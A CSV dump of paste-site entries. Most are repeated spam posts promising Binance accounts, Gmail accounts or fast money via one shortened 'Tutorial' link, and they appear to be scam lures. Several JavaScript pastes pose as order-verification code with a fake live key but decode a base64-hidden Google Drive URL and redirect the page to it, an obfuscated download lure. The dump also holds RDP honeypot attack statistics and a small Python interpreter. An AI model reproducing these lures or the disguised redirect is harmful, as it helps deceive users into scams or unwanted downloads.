id,title,username,language,date,content
QbVQeNmK,Random Gmail Acc C2,NATEWORLD,JavaScript,Monday 24th of March 2025 07:20:22 PM CDT," 
Tutorial: https://shorturl.gg/ORmzwO

Enjoy

1DIZzn9xUv
"
XMepR2gJ,2025-03-24_stats.json,rdp_snitch,JSON,Monday 24th of March 2025 07:18:18 PM CDT,"{
  ""ip"": {
    ""106.14.144.233"": 435,
    ""165.22.186.232"": 12,
    ""139.177.201.148"": 3,
    ""103.37.60.27"": 33,
    ""185.42.12.5"": 18,
    ""147.185.132.9"": 9,
    ""165.227.22.50"": 12,
    ""157.245.226.238"": 3,
    ""66.228.42.15"": 3,
    ""45.227.254.152"": 12,
    ""199.45.155.76"": 3,
    ""178.63.252.130"": 3,
    ""147.185.132.213"": 9,
    ""172.232.225.185"": 6,
    ""178.20.129.235"": 3,
    ""14.225.198.240"": 3,
    ""162.142.125.195"": 3,
    ""58.218.199.219"": 15,
    ""205.210.31.232"": 9,
    ""220.117.78.210"": 66,
    ""165.154.182.72"": 3,
    ""185.242.226.23"": 3,
    ""216.24.216.245"": 66,
    ""157.245.104.150"": 3,
    ""198.235.24.68"": 9
  },
  ""asn"": {
    ""AS37963"": 435,
    ""AS14061"": 30,
    ""AS63949"": 12,
    ""AS149147"": 33,
    ""AS59425"": 18,
    ""AS396982"": 36,
    ""AS267784"": 12,
    ""AS398722"": 3,
    ""AS24940"": 3,
    ""AS24810"": 3,
    ""AS135905"": 3,
    ""AS398324"": 3,
    ""AS4134"": 15,
    ""AS4766"": 66,
    ""AS135377"": 3,
    ""AS202425"": 3,
    ""AS174"": 66
  },
  ""isp"": {
    ""Hangzhou Alibaba Advertising Co"": 435,
    ""DigitalOcean, LLC"": 30,
    ""Akamai Technologies, Inc."": 12,
    ""Gofiber Software Technology Company Limited"": 33,
    ""Chang Way Technologies Co. Limited"": 18,
    ""Google LLC"": 36,
    ""Flyservers S.A."": 12,
    ""Censys, Inc."": 6,
    ""Hetzner Online GmbH"": 3,
    ""Teleset LLC Nchelny Branch"": 3,
    ""Vietnam Posts and Telecommunications Group"": 3,
    ""Chinanet"": 15,
    ""Korea Telecom"": 66,
    ""UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED"": 3,
    ""IP Volume inc"": 3,
    ""Ipxo LLC"": 66
  },
  ""org"": {
    ""Aliyun Computing Co., LTD"": 435,
    ""DigitalOcean, LLC"": 30,
    ""Linode"": 6,
    ""GOFIBER-SOFTWARE"": 33,
    ""Horizon LLC"": 18,
    ""Palo Alto Networks, Inc"": 36,
    ""Xwin Universal LTD"": 12,
    ""Censys, Inc."": 3,
    ""Rasoul Shamaei"": 3,
    ""Akamai Technologies, Inc."": 6,
    ""Teleset LLC"": 3,
    ""VNPT"": 3,
    ""Censys Inc"": 3,
    ""Chinanet JS"": 15,
    ""Kornet"": 66,
    ""Ucloud Information Technology (hk) Limited"": 3,
    ""AI Spera"": 3,
    ""Unknown"": 66
  },
  ""regionName"": {
    ""Shanghai"": 435,
    ""New Jersey"": 15,
    ""Georgia"": 3,
    ""Ho Chi Minh"": 33,
    ""Moscow"": 18,
    ""California"": 54,
    ""Vilnius"": 12,
    ""Kowloon"": 3,
    ""Saxony"": 3,
    ""Jakarta"": 6,
    ""Tatarstan Republic"": 3,
    ""Hanoi"": 3,
    ""Michigan"": 3,
    ""Jiangsu"": 15,
    ""Seoul"": 66,
    ""North Holland"": 3,
    ""North Rhine-Westphalia"": 66,
    ""Karnataka"": 3
  },
  ""country"": {
    ""China"": 450,
    ""United States"": 75,
    ""Vietnam"": 36,
    ""Russia"": 21,
    ""Lithuania"": 12,
    ""Hong Kong"": 3,
    ""Germany"": 69,
    ""Indonesia"": 6,
    ""South Korea"": 66,
    ""The Netherlands"": 3,
    ""India"": 3
  },
  ""account"": {
    ""hello"": 633,
    ""u6g5liub"": 12,
    ""beio"": 9,
    ""Test"": 18,
    ""FCLbxsYoI"": 3,
    ""lNqSCx"": 3,
    ""pvGnBp"": 3,
    ""w5zsc54b"": 12,
    ""(empty)"": 6,
    ""RcjDaNVqe"": 3,
    ""hOaUmq"": 3,
    ""fPYesr"": 3,
    ""Domain"": 12,
    ""vlHJdCQLz"": 3,
    ""XpYWBq"": 3,
    ""cbcAlo"": 3,
    ""Administrator"": 3,
    ""nmap"": 3,
    ""BbArRsQkw"": 3,
    ""WpAirB"": 3,
    ""IfCFzw"": 3
  },
  ""keyboard"": {
    ""Unknown"": 744
  },
  ""client_build"": {
    ""Unknown"": 744
  },
  ""client_name"": {
    ""Unknown"": 744
  },
  ""ip_type"": {
    ""hosting & proxy"": 462,
    ""hosting"": 57,
    ""Unknown"": 126,
    ""proxy"": 33,
    ""mobile & proxy"": 66
  }
}"
nsNYPcvH,2025-03-24_stats.json,rdp_snitch,JSON,Monday 24th of March 2025 07:16:12 PM CDT,"{
  ""ip"": {
    ""106.14.144.233"": 290,
    ""165.22.186.232"": 8,
    ""139.177.201.148"": 2,
    ""103.37.60.27"": 22,
    ""185.42.12.5"": 12,
    ""147.185.132.9"": 6,
    ""165.227.22.50"": 8,
    ""157.245.226.238"": 2,
    ""66.228.42.15"": 2,
    ""45.227.254.152"": 8,
    ""199.45.155.76"": 2,
    ""178.63.252.130"": 2,
    ""147.185.132.213"": 6,
    ""172.232.225.185"": 4,
    ""178.20.129.235"": 2,
    ""14.225.198.240"": 2,
    ""162.142.125.195"": 2,
    ""58.218.199.219"": 10,
    ""205.210.31.232"": 6,
    ""220.117.78.210"": 44,
    ""165.154.182.72"": 2,
    ""185.242.226.23"": 2,
    ""216.24.216.245"": 44,
    ""157.245.104.150"": 2,
    ""198.235.24.68"": 6
  },
  ""asn"": {
    ""AS37963"": 290,
    ""AS14061"": 20,
    ""AS63949"": 8,
    ""AS149147"": 22,
    ""AS59425"": 12,
    ""AS396982"": 24,
    ""AS267784"": 8,
    ""AS398722"": 2,
    ""AS24940"": 2,
    ""AS24810"": 2,
    ""AS135905"": 2,
    ""AS398324"": 2,
    ""AS4134"": 10,
    ""AS4766"": 44,
    ""AS135377"": 2,
    ""AS202425"": 2,
    ""AS174"": 44
  },
  ""isp"": {
    ""Hangzhou Alibaba Advertising Co"": 290,
    ""DigitalOcean, LLC"": 20,
    ""Akamai Technologies, Inc."": 8,
    ""Gofiber Software Technology Company Limited"": 22,
    ""Chang Way Technologies Co. Limited"": 12,
    ""Google LLC"": 24,
    ""Flyservers S.A."": 8,
    ""Censys, Inc."": 4,
    ""Hetzner Online GmbH"": 2,
    ""Teleset LLC Nchelny Branch"": 2,
    ""Vietnam Posts and Telecommunications Group"": 2,
    ""Chinanet"": 10,
    ""Korea Telecom"": 44,
    ""UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED"": 2,
    ""IP Volume inc"": 2,
    ""Ipxo LLC"": 44
  },
  ""org"": {
    ""Aliyun Computing Co., LTD"": 290,
    ""DigitalOcean, LLC"": 20,
    ""Linode"": 4,
    ""GOFIBER-SOFTWARE"": 22,
    ""Horizon LLC"": 12,
    ""Palo Alto Networks, Inc"": 24,
    ""Xwin Universal LTD"": 8,
    ""Censys, Inc."": 2,
    ""Rasoul Shamaei"": 2,
    ""Akamai Technologies, Inc."": 4,
    ""Teleset LLC"": 2,
    ""VNPT"": 2,
    ""Censys Inc"": 2,
    ""Chinanet JS"": 10,
    ""Kornet"": 44,
    ""Ucloud Information Technology (hk) Limited"": 2,
    ""AI Spera"": 2,
    ""Unknown"": 44
  },
  ""regionName"": {
    ""Shanghai"": 290,
    ""New Jersey"": 10,
    ""Georgia"": 2,
    ""Ho Chi Minh"": 22,
    ""Moscow"": 12,
    ""California"": 36,
    ""Vilnius"": 8,
    ""Kowloon"": 2,
    ""Saxony"": 2,
    ""Jakarta"": 4,
    ""Tatarstan Republic"": 2,
    ""Hanoi"": 2,
    ""Michigan"": 2,
    ""Jiangsu"": 10,
    ""Seoul"": 44,
    ""North Holland"": 2,
    ""North Rhine-Westphalia"": 44,
    ""Karnataka"": 2
  },
  ""country"": {
    ""China"": 300,
    ""United States"": 50,
    ""Vietnam"": 24,
    ""Russia"": 14,
    ""Lithuania"": 8,
    ""Hong Kong"": 2,
    ""Germany"": 46,
    ""Indonesia"": 4,
    ""South Korea"": 44,
    ""The Netherlands"": 2,
    ""India"": 2
  },
  ""account"": {
    ""hello"": 422,
    ""u6g5liub"": 8,
    ""beio"": 6,
    ""Test"": 12,
    ""FCLbxsYoI"": 2,
    ""lNqSCx"": 2,
    ""pvGnBp"": 2,
    ""w5zsc54b"": 8,
    ""(empty)"": 4,
    ""RcjDaNVqe"": 2,
    ""hOaUmq"": 2,
    ""fPYesr"": 2,
    ""Domain"": 8,
    ""vlHJdCQLz"": 2,
    ""XpYWBq"": 2,
    ""cbcAlo"": 2,
    ""Administrator"": 2,
    ""nmap"": 2,
    ""BbArRsQkw"": 2,
    ""WpAirB"": 2,
    ""IfCFzw"": 2
  },
  ""keyboard"": {
    ""Unknown"": 496
  },
  ""client_build"": {
    ""Unknown"": 496
  },
  ""client_name"": {
    ""Unknown"": 496
  },
  ""ip_type"": {
    ""hosting & proxy"": 308,
    ""hosting"": 38,
    ""Unknown"": 84,
    ""proxy"": 22,
    ""mobile & proxy"": 44
  }
}"
LL3LEvfq,2025-03-24_stats.json,rdp_snitch,JSON,Monday 24th of March 2025 07:15:09 PM CDT,"{
  ""ip"": {
    ""106.14.144.233"": 145,
    ""165.22.186.232"": 4,
    ""139.177.201.148"": 1,
    ""103.37.60.27"": 11,
    ""185.42.12.5"": 6,
    ""147.185.132.9"": 3,
    ""165.227.22.50"": 4,
    ""157.245.226.238"": 1,
    ""66.228.42.15"": 1,
    ""45.227.254.152"": 4,
    ""199.45.155.76"": 1,
    ""178.63.252.130"": 1,
    ""147.185.132.213"": 3,
    ""172.232.225.185"": 2,
    ""178.20.129.235"": 1,
    ""14.225.198.240"": 1,
    ""162.142.125.195"": 1,
    ""58.218.199.219"": 5,
    ""205.210.31.232"": 3,
    ""220.117.78.210"": 22,
    ""165.154.182.72"": 1,
    ""185.242.226.23"": 1,
    ""216.24.216.245"": 22,
    ""157.245.104.150"": 1,
    ""198.235.24.68"": 3
  },
  ""asn"": {
    ""AS37963"": 145,
    ""AS14061"": 10,
    ""AS63949"": 4,
    ""AS149147"": 11,
    ""AS59425"": 6,
    ""AS396982"": 12,
    ""AS267784"": 4,
    ""AS398722"": 1,
    ""AS24940"": 1,
    ""AS24810"": 1,
    ""AS135905"": 1,
    ""AS398324"": 1,
    ""AS4134"": 5,
    ""AS4766"": 22,
    ""AS135377"": 1,
    ""AS202425"": 1,
    ""AS174"": 22
  },
  ""isp"": {
    ""Hangzhou Alibaba Advertising Co"": 145,
    ""DigitalOcean, LLC"": 10,
    ""Akamai Technologies, Inc."": 4,
    ""Gofiber Software Technology Company Limited"": 11,
    ""Chang Way Technologies Co. Limited"": 6,
    ""Google LLC"": 12,
    ""Flyservers S.A."": 4,
    ""Censys, Inc."": 2,
    ""Hetzner Online GmbH"": 1,
    ""Teleset LLC Nchelny Branch"": 1,
    ""Vietnam Posts and Telecommunications Group"": 1,
    ""Chinanet"": 5,
    ""Korea Telecom"": 22,
    ""UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED"": 1,
    ""IP Volume inc"": 1,
    ""Ipxo LLC"": 22
  },
  ""org"": {
    ""Aliyun Computing Co., LTD"": 145,
    ""DigitalOcean, LLC"": 10,
    ""Linode"": 2,
    ""GOFIBER-SOFTWARE"": 11,
    ""Horizon LLC"": 6,
    ""Palo Alto Networks, Inc"": 12,
    ""Xwin Universal LTD"": 4,
    ""Censys, Inc."": 1,
    ""Rasoul Shamaei"": 1,
    ""Akamai Technologies, Inc."": 2,
    ""Teleset LLC"": 1,
    ""VNPT"": 1,
    ""Censys Inc"": 1,
    ""Chinanet JS"": 5,
    ""Kornet"": 22,
    ""Ucloud Information Technology (hk) Limited"": 1,
    ""AI Spera"": 1,
    ""Unknown"": 22
  },
  ""regionName"": {
    ""Shanghai"": 145,
    ""New Jersey"": 5,
    ""Georgia"": 1,
    ""Ho Chi Minh"": 11,
    ""Moscow"": 6,
    ""California"": 18,
    ""Vilnius"": 4,
    ""Kowloon"": 1,
    ""Saxony"": 1,
    ""Jakarta"": 2,
    ""Tatarstan Republic"": 1,
    ""Hanoi"": 1,
    ""Michigan"": 1,
    ""Jiangsu"": 5,
    ""Seoul"": 22,
    ""North Holland"": 1,
    ""North Rhine-Westphalia"": 22,
    ""Karnataka"": 1
  },
  ""country"": {
    ""China"": 150,
    ""United States"": 25,
    ""Vietnam"": 12,
    ""Russia"": 7,
    ""Lithuania"": 4,
    ""Hong Kong"": 1,
    ""Germany"": 23,
    ""Indonesia"": 2,
    ""South Korea"": 22,
    ""The Netherlands"": 1,
    ""India"": 1
  },
  ""account"": {
    ""hello"": 211,
    ""u6g5liub"": 4,
    ""beio"": 3,
    ""Test"": 6,
    ""FCLbxsYoI"": 1,
    ""lNqSCx"": 1,
    ""pvGnBp"": 1,
    ""w5zsc54b"": 4,
    ""(empty)"": 2,
    ""RcjDaNVqe"": 1,
    ""hOaUmq"": 1,
    ""fPYesr"": 1,
    ""Domain"": 4,
    ""vlHJdCQLz"": 1,
    ""XpYWBq"": 1,
    ""cbcAlo"": 1,
    ""Administrator"": 1,
    ""nmap"": 1,
    ""BbArRsQkw"": 1,
    ""WpAirB"": 1,
    ""IfCFzw"": 1
  },
  ""keyboard"": {
    ""Unknown"": 248
  },
  ""client_build"": {
    ""Unknown"": 248
  },
  ""client_name"": {
    ""Unknown"": 248
  },
  ""ip_type"": {
    ""hosting & proxy"": 154,
    ""hosting"": 19,
    ""Unknown"": 42,
    ""proxy"": 11,
    ""mobile & proxy"": 22
  }
}"
UG9PnCrc,Binance account 0N,allfinger01,JavaScript,Monday 24th of March 2025 07:14:41 PM CDT," 
Tutorial: https://shorturl.gg/ORmzwO

Enjoy

ZP9JDvRdgp
"
D91eCW9h,EARN $900 INSTANTLY 2025 9A,allfinger01,JavaScript,Monday 24th of March 2025 07:12:36 PM CDT," 
Tutorial: https://shorturl.gg/ORmzwO

Enjoy

O7SWcsdyU8
"
2J7xEGyv,Random Gmail Acc C2,57mato,JavaScript,Monday 24th of March 2025 07:08:36 PM CDT," 
Tutorial: https://shorturl.gg/ORmzwO

Enjoy

DYB2jxhJra
"
QiBuKfqN,Make $1000 15-MINUTES (BEGINNER) 2A,57mato,JavaScript,Monday 24th of March 2025 07:06:29 PM CDT," 
Tutorial: https://shorturl.gg/ORmzwO

Enjoy

DjeJjGR0MA
"
ffAmUi1F,Binance account 0N,57mato,JavaScript,Monday 24th of March 2025 07:04:25 PM CDT," 
Tutorial: https://shorturl.gg/ORmzwO

Enjoy

LnGmJHVkZk
"
BrUzQGiJ,EARN $900 INSTANTLY 2025 9A,57mato,JavaScript,Monday 24th of March 2025 07:02:20 PM CDT," 
Tutorial: https://shorturl.gg/ORmzwO

Enjoy

PdYlkZO7M5
"
VkrEQAym,Random Gmail Acc C2,57mato,JavaScript,Monday 24th of March 2025 07:00:15 PM CDT," 
Tutorial: https://shorturl.gg/ORmzwO

Enjoy

BzGfLl5Wq3
"
HrABySv7,Make $1000 15-MINUTES (BEGINNER) 2A,57mato,JavaScript,Monday 24th of March 2025 06:58:08 PM CDT," 
Tutorial: https://shorturl.gg/ORmzwO

Enjoy

kHtWg3CTfJ
"
PEccfJjH,Binance account 0N,57mato,JavaScript,Monday 24th of March 2025 06:56:04 PM CDT," 
Tutorial: https://shorturl.gg/ORmzwO

Enjoy

ShJdo8bsB7
"
1YALnhhq,EARN $900 INSTANTLY 2025 9A,57mato,JavaScript,Monday 24th of March 2025 06:53:58 PM CDT," 
Tutorial: https://shorturl.gg/ORmzwO

Enjoy

6IJBMCvQ1o
"
PJYQJVTS,Untitled,FleZ,JavaScript,Monday 24th of March 2025 06:51:59 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/836/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
ey76HdXF,Random Gmail Acc C2,57mato,JavaScript,Monday 24th of March 2025 06:51:52 PM CDT," 
Tutorial: https://shorturl.gg/ORmzwO

Enjoy

WAj4WlvylY
"
GFGuxABW,Make $1000 15-MINUTES (BEGINNER) 2A,57mato,JavaScript,Monday 24th of March 2025 06:49:45 PM CDT," 
Tutorial: https://shorturl.gg/ORmzwO

Enjoy

FNTBzc6ams
"
sWsy7MvX,Binance account 0N,57mato,JavaScript,Monday 24th of March 2025 06:47:39 PM CDT," 
Tutorial: https://shorturl.gg/ORmzwO

Enjoy

h6NLp3q4mt
"
XaphmPd9,EARN $900 INSTANTLY 2025 9A,57mato,JavaScript,Monday 24th of March 2025 06:45:35 PM CDT," 
Tutorial: https://shorturl.gg/ORmzwO

Enjoy

rzcNRIZBC3
"
FjrFU93x,Random Gmail Acc C2,57mato,JavaScript,Monday 24th of March 2025 06:43:31 PM CDT," 
Tutorial: https://shorturl.gg/ORmzwO

Enjoy

49h2BvwxEL
"
m35P6rJW,Make $1000 15-MINUTES (BEGINNER) 2A,57mato,JavaScript,Monday 24th of March 2025 06:41:25 PM CDT," 
Tutorial: https://shorturl.gg/ORmzwO

Enjoy

Oqmmcaq3uS
"
GYZKzeZ6,Binance account 0N,57mato,JavaScript,Monday 24th of March 2025 06:39:21 PM CDT," 
Tutorial: https://shorturl.gg/ORmzwO

Enjoy

t4fMLZZgRb
"
fGts5bAn,Untitled,FleZ,JavaScript,Monday 24th of March 2025 06:36:15 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/084/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
4yeJrLqa,Binance account 0N,madxius,JavaScript,Monday 24th of March 2025 06:34:24 PM CDT," 
Tutorial: https://shorturl.gg/ORmzwO

Enjoy

yzCgYcjD3x
"
4QNYqnDP,EARN $900 INSTANTLY 2025 9A,madxius,JavaScript,Monday 24th of March 2025 06:32:19 PM CDT," 
Tutorial: https://shorturl.gg/ORmzwO

Enjoy

bGXGxeRg06
"
D1RLTRWk,Random Gmail Acc C2,madxius,JavaScript,Monday 24th of March 2025 06:30:16 PM CDT," 
Tutorial: https://shorturl.gg/ORmzwO

Enjoy

541xhptxa4
"
17WGSMMc,Make $1000 15-MINUTES (BEGINNER) 2A,madxius,JavaScript,Monday 24th of March 2025 06:28:12 PM CDT," 
Tutorial: https://shorturl.gg/ORmzwO

Enjoy

fPr4OtM6Vg
"
QmzUEyAQ,EARN $900 INSTANTLY 2025 9A,Mouz12,JavaScript,Monday 24th of March 2025 06:26:08 PM CDT," 
Tutorial: https://shorturl.gg/ORmzwO

Enjoy

LowURSaMbu
"
iTKAX9Q2,Random Gmail Acc C2,Mouz12,JavaScript,Monday 24th of March 2025 06:23:57 PM CDT," 
Tutorial: https://shorturl.gg/ORmzwO

Enjoy

pb5UJhZk7y
"
VG6RDJg9,Untitled,FleZ,JavaScript,Monday 24th of March 2025 06:20:49 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/627/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
NN3EdbzW,Untitled,FleZ,JavaScript,Monday 24th of March 2025 06:05:27 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/397/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
PEpXMRYU,Untitled,quab,Python,Monday 24th of March 2025 06:05:16 PM CDT,"__main__.py:
import xfox
import sys,asyncio
try:
    from termcolor import colored
except:
    def colored(a,b):
        return a
def main():
    global argv
    argv=sys.argv[1:]
    try:
        match argv[0]:
            case ""-p"":
                try:
                    return asyncio.run(xfox.parse(""\n"".join(argv[1:])))
                except xfox.Raise as e:
                    print(colored(f""[ERROR] {e.args[0]['name']}: {e.args[0]['text']}"",""red""))
            case _:
                try:
                    with open(argv[0], ""r"") as f:
                        return asyncio.run(xfox.parse(""\n"".join(f.readlines())))
                except FileNotFoundError as e:
                    print(colored(f""[ERROR] File {argv[0]} not found"",""red""))
                except xfox.Raise as e:
                    print(colored(f""[ERROR] {e.args[0]['name']}: {e.args[0]['text']}"",""red""))
    except IndexError:
        print(""Atterlity-xfox ""+xfox.VERSION)
        print(""Its just a compiller... Type something.."")
        while True:
            try:
                a=input("">>> "")
            except KeyboardInterrupt:
                return 0
            try:
                print(asyncio.run(xfox.parse(a)))
            except xfox.Raise as e:
                print(colored(f""[ERROR] {e.args[0]['name']}: {e.args[0]['text']}"",""red""))

main()"
FnNyiq3Z,Untitled,quab,Python,Monday 24th of March 2025 06:04:49 PM CDT,"__init__.py:

# Говнокод от (меня)
import re,asyncio,inspect,json,io,contextlib,traceback,math,importlib,random,time
import nest_asyncio,uuid
try:
    from termcolor import colored
except:
    def colored(a,b):
        return a

class funcs:
    def __init__(self) -> None:
        pass
class anonfuncs:
    def __init__(self) -> None:
        pass
class CacheData:
    pass
class AnonFunction:
    def __init__(self,name,code):
        self.name=name
        self.__code=code
    async def compile(self):
        return await parse(self.__code)
VERSION=""0.1.7""
cache=CacheData()
class StopWord(Exception):
    def __init__(self, text):
        super().__init__(text)
class Empty(Exception):
    def __init__(self, text):
        super().__init__(text)
class OnlyIf(Exception):
    def __init__(self, text):
        super().__init__(text)
class WrongAnnotation(Exception):
    def __init__(self, text):
        super().__init__(text)
class Raise(Exception):
    def __init__(self, text):
        super().__init__(text)

DNTl=[""xfexec"",'try','if','for','def','while',""dowhile""]
output_rep={""&i"":'$',""&j"":""&"",""&k"":';',""&s"":'//'}

async def isempty(item, count=-1):
    fname=traceback.extract_stack()[-2][2]
    fvar=list(inspect.currentframe().f_back.f_locals.items())
    if item == '': raise Empty(f""Mising var {fvar[0][0]} in {fname}"")
    elif len(item)<count or count!=-1: raise Empty(f""Mising vars in {fname}"")
    return False

def isindclass(a,b):
    if a is b:
        return True
    else:
        return False

def classreturn(self):
    return f""<Class {self.name}>""

def addfunc(clas, name=None):
    def wrapper(func):
        if name == None:
            setattr(clas, func.__name__.lower(), func)
            return func
        setattr(clas, name.lower(), func)
        return func
    return wrapper

@addfunc(funcs, 'exec')
async def pyexec(back:bool,*args, **kwargs):
    ""Allows to execute python code.""
    str_obj = io.StringIO()
    nest_asyncio.apply()
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    try:
        with contextlib.redirect_stdout(str_obj):
            async def execd():
                exec(args[0])
            loop.run_until_complete(execd())
            loop.close()
    except Exception as e:
        return e
    ret=str_obj.getvalue()
    str_obj.close()
    if back:
        return ret
    else: return """"

@addfunc(funcs, 'help')
async def phelp(name: str,*args, **kwargs):
    ""Allows you to find out the docstring and arguments of a function.""
    a=getattr(funcs, name)
    if a.__doc__ == None or a.__doc__ == '':
        return ""The function haven't docstring""
    else:
        return a.__doc__

@addfunc(funcs, 'break')
async def pbreak(*args, **kwargs):
    ""Why?""
    raise StopWord(""Break outside the cycle"")

@addfunc(funcs, 'raise')
async def praise(error:str,text:str,*args, **kwargs):
    ""Allows you to raise errors.""
    raise Raise({""name"":error,""text"":text})

@addfunc(funcs, 'input')
async def pinput(text: str, *args, **kwargs):
    ""Get user input from console.""
    return input(text)

@addfunc(funcs, 'print')
async def console(*args, **kwargs):
    ""Allows you to send a log message to the console.""
    print(colored(""[LOG] ""+'\n'.join(args),""yellow""))
    return ''

@addfunc(funcs, 'xfexec')
async def xfexec(back:bool,*args, **kwargs):
    ""Allows you working with xfox from code.""
    try:
        a = await __parse_code(args[0], **kwargs)
    except Exception as e:
        return e
    if back == True:
        return a

@addfunc(funcs, 'onlyif')
async def onlyif(item: str, message: str, *args, **kwargs):
    ""Checks the statement and throws an error, if False..""
    if eval(item):
        return """"
    else:
        raise OnlyIf(message)
    
@addfunc(funcs, 'import')
async def importt(item:str, *args, **kwargs):
    ""Just... import...""
    importlib.import_module(item, package=None)
    return ''
        
    
@addfunc(funcs, 'eval')
async def mathh(item:str, *args, **kwargs):
    ""Just... eval...""
    return eval(item)

@addfunc(funcs, 'let')
async def let(name:str, value, *args, **kwargs):
    ""Allows you to store data.""
    setattr(cache, name, value)
    return """"
@addfunc(funcs, 'get')
async def get(name:str, *args, **kwargs):
    ""Allows you to get data from storage.""
    return getattr(cache, name)

@addfunc(funcs, 'try')
async def xftry(onerror:str, *args, **kwargs):
    ""Just... 'try' from python...""
    try:
        return await __parse_code(args[0], **kwargs)
    except Exception as e:
        await let(""_"",e)
        return onerror
    
@addfunc(funcs, 'random')
async def xfrandom(x:int, y:int, *args, **kwargs):
    ""Allows  to get random number from X to Y""
    return random.randint(x,y)

@addfunc(funcs, ""if"")
async def xfif(*args, **kwargs):
    ""Just... 'if' from python...""
    if len(args)%2==0:
        for i in range(0,len(args),2):
            if eval(await parse(args[i],in_cycle=True, **kwargs)):
                return await parse(args[i+1],in_cycle=True, **kwargs)
    elif len(args)%2==1:
        for i in range(0,len(args[:-1]),2):
            if eval(await parse(args[i],in_cycle=True, **kwargs)):
                return await parse(args[i+1],in_cycle=True, **kwargs)
        else:
            return await parse(args[::-1][0],in_cycle=True, **kwargs)

@addfunc(funcs, ""while"")
async def xfwhile(q, code:str,*args, **kwargs):
    ""Just... 'while' from python...""
    trash=''
    while eval(await parse(q,in_cycle=True,**kwargs)):
        try:
            a=await parse(code, stop_word=True,in_cycle=True, **kwargs)
        except StopWord:
                break
        trash=trash+a
    return trash

@addfunc(funcs, ""dowhile"")
async def xfdowhile(q, code:str,*args, **kwargs):
    ""do 'do' and check 'while'. If 'while'=True continue doing 'do'""
    trash=await parse(code, stop_word=True,in_cycle=True, **kwargs)
    while eval(await parse(q,in_cycle=True,**kwargs)):
        try:
            a=await parse(code, stop_word=True,in_cycle=True, **kwargs)
        except StopWord:
                break
        trash=trash+a
    return trash


@addfunc(funcs, ""for"")
async def xffor(item, code:str,*args, **kwargs):
    ""Just... 'for' from python...""
